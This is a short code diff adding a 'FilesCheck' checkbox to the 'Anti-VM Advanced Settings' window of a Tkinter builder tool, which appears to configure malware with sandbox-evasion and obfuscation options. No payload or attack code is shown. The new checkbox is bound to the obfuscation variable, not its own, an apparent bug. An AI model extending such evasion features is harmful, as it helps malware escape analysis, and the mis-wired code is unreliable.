@@ -620,6 +620,22 @@ class Builder:
                 advanced_settings.geometry('300x200')
                 advanced_settings.title('Anti-VM Advanced Settings')
 
+                advanced_canvas = tk.Canvas(advanced_settings, border=0, highlightthickness=0)
+                advanced_canvas.place(x=0,y=40,width=300,height=200)
+
+                cbvar_filecheck = tk.BooleanVar(value=True)
+                cb_filecheck = tk.Checkbutton(
+                    advanced_canvas,
+                    selectcolor='#0A0A10',
+                    text='FilesCheck',
+                    font=('Consolas', 12),
+                    variable=self.cbvar_obfuscation,
+                    onvalue=True,
+                    offvalue=False
+                )
+                cb_filecheck.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['advanced_antivm']))
+                cb_filecheck.bind("<Leave>", self.hide_tooltip)
+                advanced_canvas.create_window(25, 5, window=cb_filecheck, anchor='w')
 
 
             advanced_settings.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
